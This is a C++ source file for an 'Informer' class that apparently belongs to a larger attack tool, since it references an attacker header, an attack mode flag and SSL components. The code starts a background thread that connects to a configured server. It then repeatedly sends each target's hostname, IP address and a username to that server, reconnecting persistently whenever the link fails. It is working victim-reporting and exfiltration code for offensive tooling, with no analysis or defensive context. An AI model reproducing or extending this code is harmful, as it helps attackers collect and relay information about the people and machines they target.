
#include <windows.h>
#include <WinSock2.h>
#include "informer.h"
#include "utils/BaseSocket.h"
#include <stdio.h>
#include "attacker.h"
#include "Public.h"
#include "ssl/sslPublic.h"
#include "Utils/Tools.h"
#include "main.h"

int __stdcall Informer::notifyServer(Informer * instance) {

	int s = BaseSocket::connectServer(instance->mServerIP,INFORMER_PORT);
	if (s == INVALID_SOCKET)
	{
		log("Informer connect server error:%d\r\n",GetLastError());
		//MessageBoxA(0, szout, szout, MB_OK);
		//ExitProcess(0);
		return -1;
	}
	int ret = 0;
	MSG msg = { 0 };

	TARGET_INFO ti = { 0 };
	while (1)
	{	
		ret = GetMessageA(&msg, 0, 0, 0);
 		if (ret && msg.message == TARGET_INFO_TAG)
		{
			memset(&ti, 0, sizeof(TARGET_INFO));
			if (msg.wParam > 0)
			{
				char * hostname = (char*)msg.wParam;
				lstrcpyA(ti.host, hostname);
				delete []hostname;
			}
			
			ti.ip = (unsigned long)msg.lParam;

			lstrcpyA((char*)ti.user, G_USERNAME);
			
			ti.len = sizeof(TARGET_INFO) - MAX_DOMAIN_NAME_SIZE + lstrlenA(ti.host);
			ti.cmd = TARGET_INFO_TAG;

			ret = send(s, (char*)&ti, ti.len, 0);
			if (ret <= 0)
			{
				closesocket(s);

				while (1)
				{
					s = BaseSocket::connectServer(instance->mServerIP, INFORMER_PORT);
					if (s == INVALID_SOCKET)
					{
						Sleep(6000);
					}
					else {
						break;
					}
				}

				ret = send(s, (char*)&ti, ti.len, 0);
				if (ret <= 0)
				{
					log( "Informer send info error,cmd:%u,ip:%08x\r\n", msg.message, msg.lParam);
				}
				else {
					//printf("Informer send info ok,cmd:%u,ip:%08x\r\n", msg.message, msg.lParam);
				}
			}
			else {
				//printf("Informer send info ok,cmd:%u,ip:%08x\r\n", msg.message, msg.lParam);
			}
		}
	}

	closesocket(s);
	return 0;
}


int Informer::notify(unsigned long ip,char* host) {
	if (gAttackMode == ATTACK_STANDBY_MODE) {
		return 0;
	}
	char *strhost = new char [256];
	lstrcpyA(strhost, host);
	int iRet = PostThreadMessageA(mInformerTID, TARGET_INFO_TAG, (WPARAM)strhost, (LPARAM)ip);
	if (iRet <= 0)
	{
		printf("Informer PostThreadMessageA error:%u\r\n", GetLastError());
		
	}
	return iRet;
}



Informer::Informer() {
	mInstance = 0;
}



Informer::Informer(LPVOID serverIP) {

	mInstance = this;

	mServerIP = (DWORD)serverIP;

	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Informer::notifyServer,
		(LPVOID)this->mInstance, STACK_SIZE_PARAM_IS_A_RESERVATION, &mInformerTID));
}



Informer::~Informer() {

}